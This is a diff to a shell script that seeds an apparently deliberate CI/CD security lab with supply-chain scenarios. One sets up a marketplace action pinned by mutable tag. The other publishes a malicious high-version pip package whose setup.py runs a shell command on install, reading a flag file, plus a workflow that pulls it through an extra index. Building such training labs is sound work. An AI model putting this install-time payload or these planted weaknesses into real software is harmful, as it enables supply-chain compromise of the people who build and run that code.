@@ -306,6 +306,78 @@ sc_pbac_3(){
     -d "name=main" -d "push_access_level=30" -d "merge_access_level=30" >/dev/null 2>&1
 }
 
+# ========================= Supply chain (SUP-*) ===================================
+
+# ---- SUP-1: 3rd-party CI action pinned by TAG (not SHA) -> re-tag attack -> RCE ---------
+sc_sup_1(){
+  say "SUP-1 action pinned by mutable ref (not SHA) -> re-point RCE"
+  on "$HOST_RUNNER" "echo '$(flag sup_1-action-retag)' > /opt/minilab2/sup1-flag.txt; chmod 644 /opt/minilab2/sup1-flag.txt"
+  # a PUBLIC marketplace org hosting a 3rd-party composite action (act_runner clones it anonymously)
+  gitea_api POST /orgs -d '{"username":"marketplace","visibility":"public"}' >/dev/null 2>&1
+  gitea_api POST /orgs/marketplace/repos -d '{"name":"deploy-action","private":false,"auto_init":true,"default_branch":"main"}' >/dev/null 2>&1
+  local W; W=$(mktemp -d)
+  if git clone -q "http://$ADMIN_USER:$ADMIN_PASS@gitea:3000/marketplace/deploy-action.git" "$W/da" 2>/dev/null; then ( cd "$W/da"
+    cat > action.yml <<'YML'
+name: deploy-helper
+description: shared composite action
+runs:
+  using: composite
+  steps:
+    - run: echo "shared deploy-helper v1"
+      shell: bash
+YML
+    gc add -A && gc commit -q -m "deploy-helper v1"; gc branch -f v1
+    gc push -q origin main 2>/dev/null; gc push -f -q origin v1 2>/dev/null ); fi
+  # alpha/app consumes the action by mutable ref @v1
+  if gclone_alpha app "$W/app"; then ( cd "$W/app"; mkdir -p .gitea/workflows
+    cat > .gitea/workflows/sup1.yml <<'YML'
+name: sup1-shared-action
+on: [push]
+jobs:
+  use-shared:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: http://gitea:3000/marketplace/deploy-action@v1
+YML
+    gc add -A && gc commit -q -m "use marketplace deploy-action@v1" && gc push -q origin main 2>/dev/null ); fi
+  rm -rf "$W"
+}
+
+# ---- SUP-4: dependency confusion (malicious higher version on the internal mirror) ------
+sc_sup_4(){
+  say "SUP-4 dependency confusion (malicious internal package on the mirror)"
+  on "$HOST_RUNNER" "echo '$(flag sup_4-dependency-confusion)' > /opt/minilab2/sup4-flag.txt; chmod 644 /opt/minilab2/sup4-flag.txt; command -v pip3 >/dev/null 2>&1 || { apt-get update -y >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get install -y python3-pip >/dev/null 2>&1; }"
+  # publish a malicious high-version alpha-utils to the internal PEP503 index on the mirror
+  on "$HOST_MINIO" "bash -s" <<'MIR'
+set -e
+D=/var/www/simple/alpha-utils
+rm -rf /tmp/pkgbuild; mkdir -p /tmp/pkgbuild/alpha_utils-9.9.9
+cat > /tmp/pkgbuild/alpha_utils-9.9.9/setup.py <<'PY'
+import os
+os.system("cat /opt/minilab2/sup4-flag.txt > /tmp/sup4-proof 2>/dev/null")
+from setuptools import setup
+setup(name="alpha-utils", version="9.9.9", py_modules=[])
+PY
+( cd /tmp/pkgbuild && tar czf alpha_utils-9.9.9.tar.gz alpha_utils-9.9.9 )
+mkdir -p "$D"; cp /tmp/pkgbuild/alpha_utils-9.9.9.tar.gz "$D/"
+printf '<!DOCTYPE html><html><body>\n<a href="alpha_utils-9.9.9.tar.gz">alpha_utils-9.9.9.tar.gz</a>\n</body></html>\n' > "$D/index.html"
+rm -rf /tmp/pkgbuild
+MIR
+  local W; W=$(mktemp -d)
+  if gclone_alpha app "$W/app"; then ( cd "$W/app"; mkdir -p .gitea/workflows
+    cat > .gitea/workflows/sup4.yml <<'YML'
+name: sup4-deps
+on: [push]
+jobs:
+  deps:
+    runs-on: ubuntu-latest
+    steps:
+      - name: install internal dependency (mirror shadows the name)
+        run: pip3 install --user --break-system-packages --force-reinstall --no-cache-dir --extra-index-url http://mirror:8080/simple/ --trusted-host mirror alpha-utils
+YML
+    gc add -A && gc commit -q -m "install internal deps in CI" && gc push -q origin main 2>/dev/null ); fi; rm -rf "$W"
+}
+
 # ========================= Pipeline execution & injection (PPE-*) =================
 
 # ---- PPE-1: expression injection — untrusted commit message flows into a run: step -----
